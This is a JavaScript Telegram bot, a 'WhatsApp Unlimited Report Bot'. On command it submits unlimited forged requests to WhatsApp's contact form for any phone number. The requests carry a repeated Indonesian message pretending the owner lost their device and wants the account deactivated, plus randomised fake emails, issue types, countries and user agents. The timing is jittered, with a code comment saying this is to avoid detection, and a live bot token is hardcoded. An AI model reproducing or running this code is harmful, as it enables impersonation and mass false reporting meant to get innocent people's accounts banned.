const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const FormData = require('form-data');
const config = {
  botToken: '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM',
  contactUrl: 'https://www.whatsapp.com/contact/',
  baseDelay: 20000,
  turboDelay: 500,
  statusInterval: 10000,
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
  ],
  maxRetries: 5, 
  retryDelay: 3000 
};
const descriptions = [
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
       "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
];
const bot = new TelegramBot(config.botToken, {polling: true});
const reportState = {
  isActive: false,
  isTurbo: false,
  targetNumber: '',
  successCount: 0,
  attemptCount: 0,
  errorCount: 0,
  startTime: null,
  statusInterval: null,
  progressMsgId: null,
  chatId: null
};
function getRuntime() {
  const seconds = Math.floor((Date.now() - reportState.startTime) / 1000);
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${hours}h ${minutes}m ${secs}s`;
}
function getDelay() {
  if (reportState.isTurbo) {
    return config.turboDelay + Math.random() * 1000;
  }
  return config.baseDelay + Math.random() * 5000;
}
async function submitWhatsAppReport(phone) {
  let retries = 0;
  while (retries < config.maxRetries) {
    try {
      const userAgent = config.userAgents[Math.floor(Math.random() * config.userAgents.length)];
      const form = new FormData();
      form.append('subject', 'messenger');
      form.append('phone', phone.replace(/[^0-9+]/g, ''));
      form.append('email', `hozooimut${Math.floor(Math.random() * 1000000)}@gmail.com${Math.floor(Math.random() * 100)}.ws`);
      form.append('issue', ['spam', 'harassment', 'fake_account', 'scam', 'phishing', 'impersonation'][Math.floor(Math.random() * 6)]);
      form.append('description', descriptions[Math.floor(Math.random() * descriptions.length)].replace('${phone}', phone));
      form.append('country', ['US', 'UK', 'ID', 'IN', 'BR', 'DE', 'FR', 'CA', 'AU'][Math.floor(Math.random() * 9)]);
      form.append('platform', ['Android', 'iPhone', 'Web', 'Desktop', 'Windows Phone', 'iPad'][Math.floor(Math.random() * 6)]);
      
      const response = await axios.post(config.contactUrl, form, {
        headers: {
          ...form.getHeaders(),
          'User-Agent': userAgent,
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://www.whatsapp.com',
          'Origin': 'https://www.whatsapp.com',
          'X-Requested-With': 'XMLHttpRequest'
        },
        timeout: reportState.isTurbo ? 3000 : 10000,
        maxRedirects: 0,
        validateStatus: function (status) {
          return (status >= 200 && status < 300) || status === 302;
        }
      });

      return true;
    } catch (error) {
      retries++;
      reportState.errorCount++;
      
      if (retries < config.maxRetries) {
        await new Promise(resolve => setTimeout(resolve, config.retryDelay));
      } else {
        console.error(`Final attempt failed for ${phone}:`, error.message);
        return false;
      }
    }
  }
}

async function updateStatus() {
  if (!reportState.isActive) return;
  
  try {
    await bot.editMessageText(
      `📊 *Active Report* 📊\n\n` +
      `🔢 Target: ${reportState.targetNumber}\n` +
      `⚡ Mode: ${reportState.isTurbo ? 'TURBO ⚡' : 'NORMAL'}\n` +
      `🕒 Runtime: ${getRuntime()}\n` +
      `📤 Attempts: ${reportState.attemptCount}\n` +
      `✅ Successes: ${reportState.successCount}\n` +
      ` ✅ Successes ${reportState.errorCount}\n\n` +
      `_Automatic unlimited reporting in progress..._`,
      {
        chat_id: reportState.chatId,
        message_id: reportState.progressMsgId,
        parse_mode: 'Markdown',
        reply_markup: {inline_keyboard: [[{text: '🛑 Stop Reporting', callback_data: 'stop'}]]}
      }
    );
  } catch (error) {
    console.log('Status update error:', error.message);
  }
}

async function startUnlimitedReport(msg, isTurbo = false) {
  if (reportState.isActive) {
    return bot.sendMessage(msg.chat.id, `⚠️ Already reporting ${reportState.targetNumber}`);
  }

  const targetNumber = msg.text.split(' ')[1]?.trim();
  if (!targetNumber) {
    return bot.sendMessage(msg.chat.id, '⚠️ Please provide a phone number in international format (e.g., +6281234567890)');
  }

  // Initialize report state
  reportState.isActive = true;
  reportState.isTurbo = isTurbo;
  reportState.targetNumber = targetNumber;
  reportState.successCount = 0;
  reportState.attemptCount = 0;
  reportState.errorCount = 0;
  reportState.startTime = Date.now();
  reportState.chatId = msg.chat.id;

  const progressMsg = await bot.sendMessage(
    msg.chat.id,
    `🚀 Starting UNLIMITED ${isTurbo ? 'TURBO ⚡' : 'NORMAL'} report for ${targetNumber}...\n` +
    `Attempts: 0\nSuccesses: 0\nErrors: 0\nRuntime: 0s`,
    {
      parse_mode: 'Markdown',
      reply_markup: {inline_keyboard: [[{text: '🛑 Stop', callback_data: 'stop'}]]}
    }
  );
  
  reportState.progressMsgId = progressMsg.message_id;
  reportState.statusInterval = setInterval(updateStatus, config.statusInterval);

  // Unlimited reporting loop
  while (reportState.isActive) {
    try {
      reportState.attemptCount++;
      const success = await submitWhatsAppReport(reportState.targetNumber);
      if (success) reportState.successCount++;
      
      // Dynamic delay to avoid detection
      const currentDelay = getDelay();
      await new Promise(resolve => setTimeout(resolve, currentDelay));
    } catch (error) {
      console.error('Error in reporting loop:', error);
      reportState.errorCount++;
      // Continue despite errors for unlimited reporting
      await new Promise(resolve => setTimeout(resolve, config.retryDelay));
    }
  }

  // Cleanup when stopped
  clearInterval(reportState.statusInterval);
  await bot.sendMessage(
    reportState.chatId,
    `🛑 Stopped reporting ${reportState.targetNumber}\n` +
    `Final Stats:\n` +
    `Attempts: ${reportState.attemptCount}\n` +
    `Successes: ${reportState.successCount}\n` +
    `Errors: ${reportState.errorCount}\n` +
    `Total Runtime: ${getRuntime()}`,
    {parse_mode: 'Markdown'}
  );
}

// Command handlers
bot.onText(/\/start/, (msg) => {
  const helpText = `🚀 *WhatsApp Unlimited Report Bot* 🚀\n\n` +
    `This bot can send UNLIMITED reports to WhatsApp for any number\n\n` +
    `*Commands:*\n` +
    `/unlimited [number] - Start unlimited reporting\n` +
    `/turbo [number] - Turbo mode (faster reporting)\n` +
    `/status - Check current status\n` +
    `/stop - Stop reporting\n\n` +
    `Example: /unlimited +6281234567890`;
  
  bot.sendMessage(msg.chat.id, helpText, {parse_mode: 'Markdown'});
});

bot.onText(/\/unlimited (.+)/, (msg) => startUnlimitedReport(msg, false));
bot.onText(/\/turbo (.+)/, (msg) => startUnlimitedReport(msg, true));

bot.onText(/\/status/, (msg) => {
  if (reportState.isActive) {
    updateStatus();
  } else {
    bot.sendMessage(msg.chat.id, '⚠️ No active reporting session. Use /unlimited or /turbo to start.');
  }
});

bot.onText(/\/stop/, (msg) => {
  if (reportState.isActive) {
    reportState.isActive = false;
    bot.sendMessage(msg.chat.id, '🛑 Stopping report process...');
  } else {
    bot.sendMessage(msg.chat.id, 'No active reporting session to stop');
  }
});

bot.on('callback_query', (query) => {
  if (query.data === 'stop' && reportState.isActive) {
    reportState.isActive = false;
    bot.answerCallbackQuery(query.id, {text: 'Reporting will stop after current attempt...'});
  }
});

console.log('⚡ WhatsApp Unlimited Report Bot is running!');
